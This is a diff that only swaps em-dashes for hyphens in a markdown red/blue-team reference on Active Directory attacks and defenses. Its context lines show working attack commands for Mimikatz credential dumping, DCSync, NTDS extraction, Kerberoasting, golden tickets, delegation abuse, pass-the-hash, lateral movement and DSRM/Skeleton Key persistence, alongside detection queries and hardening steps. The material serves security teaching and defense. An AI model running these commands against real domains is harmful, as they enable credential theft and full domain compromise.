@@ -1,4 +1,4 @@
-# Active Directory — Attacks & Defense Deep Dive
+# Active Directory - Attacks & Defense Deep Dive
 
 > **Scope:** Active Directory attack techniques, post-exploitation paths, Kerberos abuse, privilege escalation, and corresponding defensive controls and detection logic. Structured for both red and blue team reference.
 
@@ -46,11 +46,11 @@ Forest
 |---|---|
 | Domain Controller | Authenticates users, stores directory, replicates AD |
 | SYSVOL | Shared folder on DCs storing GPOs, logon scripts |
-| NTDS.dit | AD database — contains all hashes and objects |
+| NTDS.dit | AD database - contains all hashes and objects |
 | Global Catalog | Cross-domain search index |
 | FSMO Roles | 5 single-master operations roles (PDC Emulator, RID Master, etc.) |
 | Kerberos KDC | Issues TGTs (krbtgt) and service tickets |
-| LDAP | Directory access protocol — used for all AD queries |
+| LDAP | Directory access protocol - used for all AD queries |
 | DNS | AD-integrated DNS is critical for domain function |
 
 ### Trust Types
@@ -156,7 +156,7 @@ MATCH (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})-[:AdminTo]->(c:Computer) RETUR
 ldapsearch -H ldap://DC01.corp.local -x -b "DC=corp,DC=local" \
   -D "corp\user" -w "Password1" "(objectClass=user)" cn sAMAccountName
 
-# Enumerate users without authentication (null bind — often disabled)
+# Enumerate users without authentication (null bind - often disabled)
 ldapsearch -H ldap://DC01.corp.local -x -b "DC=corp,DC=local" "(objectClass=user)"
 
 # Find accounts with password not required
@@ -248,7 +248,7 @@ python3 ntlmrelayx.py -tf dc01.corp.local -smb2support --delegate-access --escal
 ### Credential Dumping
 
 ```powershell
-# Mimikatz — dump credentials from LSASS
+# Mimikatz - dump credentials from LSASS
 privilege::debug
 sekurlsa::logonpasswords           # Cleartext + hashes from LSASS
 sekurlsa::wdigest                  # WDigest (cleartext if enabled)
@@ -261,7 +261,7 @@ lsadump::dcsync /domain:corp.local /user:krbtgt  # DCSync
 crackmapexec smb TARGET -u Admin -p Pass --ntds     # Dump NTDS.dit via VSS
 crackmapexec smb TARGET -u Admin -p Pass --lsa      # Dump LSA secrets
 
-# Secretsdump (Impacket) — remote NTDS dump
+# Secretsdump (Impacket) - remote NTDS dump
 python3 secretsdump.py corp/Administrator@DC01 -hashes :HASH
 python3 secretsdump.py corp/Administrator@DC01 -outputfile hashes.txt
 ```
@@ -272,7 +272,7 @@ python3 secretsdump.py corp/Administrator@DC01 -outputfile hashes.txt
 
 ### Kerberoasting
 
-Request TGS tickets for service accounts (SPNs) — tickets are encrypted with the service account's NTLM hash and can be cracked offline.
+Request TGS tickets for service accounts (SPNs) - tickets are encrypted with the service account's NTLM hash and can be cracked offline.
 
 ```powershell
 # Find Kerberoastable accounts
@@ -294,7 +294,7 @@ hashcat -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule
 
 ### AS-REP Roasting
 
-Accounts with pre-authentication disabled will return an AS-REP encrypted with their NTLM hash — no credentials required to request.
+Accounts with pre-authentication disabled will return an AS-REP encrypted with their NTLM hash - no credentials required to request.
 
 ```powershell
 # Find AS-REP roastable accounts
@@ -313,7 +313,7 @@ hashcat -m 18200 asrep.txt rockyou.txt
 
 ### Golden Ticket
 
-Forge TGTs using the krbtgt hash — valid for any user in the domain, bypasses all password changes.
+Forge TGTs using the krbtgt hash - valid for any user in the domain, bypasses all password changes.
 
 ```powershell
 # Requirements: krbtgt NTLM hash, domain SID
@@ -350,7 +350,7 @@ kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:server01.corp.loca
 
 ### Diamond Ticket
 
-Modify a legitimate TGT rather than forge from scratch — harder to detect than golden ticket.
+Modify a legitimate TGT rather than forge from scratch - harder to detect than golden ticket.
 
 ```powershell
 # Rubeus diamond ticket
@@ -367,7 +367,7 @@ Get-DomainComputer -TrustedToAuth
 # S4U2Self + S4U2Proxy to impersonate any user to the target service
 .\Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:"cifs/server01.corp.local" /ptt
 
-# Unconstrained delegation — any service can be impersonated
+# Unconstrained delegation - any service can be impersonated
 # Find unconstrained delegation hosts
 Get-DomainComputer -Unconstrained | Select-Object dnshostname
 # Printer bug / SpoolSample to coerce DC auth to unconstrained delegation host
@@ -410,7 +410,7 @@ Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs |
 
 ### DCSync
 
-Replicate the AD database as if you were a Domain Controller — dumps all hashes.
+Replicate the AD database as if you were a Domain Controller - dumps all hashes.
 
 ```powershell
 # Requirements: Replicating Directory Changes + Replicating Directory Changes All permissions
@@ -446,7 +446,7 @@ crackmapexec winrm TARGET -u Admin -p Pass -x "whoami"
 # Impacket psexec (uploads binary, creates service)
 python3 psexec.py corp/Admin:Pass@TARGET
 
-# smbexec (no binary upload — uses cmd.exe via service)
+# smbexec (no binary upload - uses cmd.exe via service)
 python3 smbexec.py corp/Admin:Pass@TARGET
 ```
 
@@ -470,7 +470,7 @@ Convert NTLM hash to Kerberos TGT for authentication:
 # Mimikatz
 sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH /run:powershell.exe
 
-# Rubeus (more stealthy — doesn't spawn process with stolen token)
+# Rubeus (more stealthy - doesn't spawn process with stolen token)
 .\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
 ```
 
@@ -500,7 +500,7 @@ Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local
 ### DSRM Abuse
 
 ```powershell
-# Directory Services Restore Mode password — local admin on DC even after domain compromise
+# Directory Services Restore Mode password - local admin on DC even after domain compromise
 # Enable DSRM logon via network (disabled by default)
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
 
@@ -511,7 +511,7 @@ ntdsutil "set dsrm password" "reset password on server null" "P@ssword1" q q
 ### Skeleton Key
 
 ```powershell
-# Inject master password into LSASS on DC — all accounts accept both real and skeleton key
+# Inject master password into LSASS on DC - all accounts accept both real and skeleton key
 # Mimikatz (runs in memory, lost on reboot)
 misc::skeleton
 
@@ -560,7 +560,7 @@ mimikatz # lsadump::dcshadow /push
 
 ```powershell
 # Alert on TGS requests for service tickets encrypted with RC4 (type 23)
-# Modern environments should use AES encryption — RC4 requests = Kerberoasting
+# Modern environments should use AES encryption - RC4 requests = Kerberoasting
 
 # KQL (Sentinel / Defender)
 SecurityEvent
@@ -575,7 +575,7 @@ SecurityEvent
 ### DCSync Detection
 
 ```powershell
-# DCSync uses DRSUAPI replication rights — generates Event 4662
+# DCSync uses DRSUAPI replication rights - generates Event 4662
 # Alert on: 4662 events where AccessMask = 0x100 AND Properties contain replication GUIDs
 
 # GUID for "Replicating Directory Changes": {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
@@ -709,14 +709,14 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" 
 ### Kerberos Hardening
 
 ```powershell
-# Enforce AES encryption — eliminate RC4 (removes Kerberoasting effectiveness)
+# Enforce AES encryption - eliminate RC4 (removes Kerberoasting effectiveness)
 # Set msDS-SupportedEncryptionTypes = 24 (AES128 + AES256) on service accounts
 
 # Rotate krbtgt password regularly
 # Use ADKerberosDelegation module or Microsoft's New-KrbtgtKeys.ps1
 # Rotate twice (once to invalidate old tickets, once more 10 hours later)
 
-# AS-REP roasting prevention — require pre-auth for all accounts
+# AS-REP roasting prevention - require pre-auth for all accounts
 # Audit accounts with DONT_REQ_PREAUTH flag:
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
 
@@ -727,15 +727,15 @@ Set-ADAccountControl -Identity account -DoesNotRequirePreAuth $false
 ### ACL Hardening
 
 ```powershell
-# Audit delegated permissions — find non-admin objects with replication rights
+# Audit delegated permissions - find non-admin objects with replication rights
 Get-ADObject -Filter * -Properties ntSecurityDescriptor | 
   Where-Object {$_.ntSecurityDescriptor.Access | 
     Where-Object {$_.ObjectType -match "1131f6aa|1131f6ab" -and 
                   $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM"}}
 
 # Remove dangerous permissions from default objects
-# AdminSDHolder — audit who has write access
-# Domain object root — audit for WriteDACL, GenericAll
+# AdminSDHolder - audit who has write access
+# Domain object root - audit for WriteDACL, GenericAll
 
 # Enable AD Recycle Bin
 Enable-ADOptionalFeature 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target 'corp.local'
@@ -827,4 +827,4 @@ Infrastructure
 - [Harmj0y AD Security Blog](https://blog.harmj0y.net/)
 - [Microsoft AD Security Best Practices](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/)
 - [Pingcastle AD Health Check](https://www.pingcastle.com/)
-- [Purple Knight](https://www.purple-knight.com/) — Free AD assessment tool
+- [Purple Knight](https://www.purple-knight.com/) - Free AD assessment tool
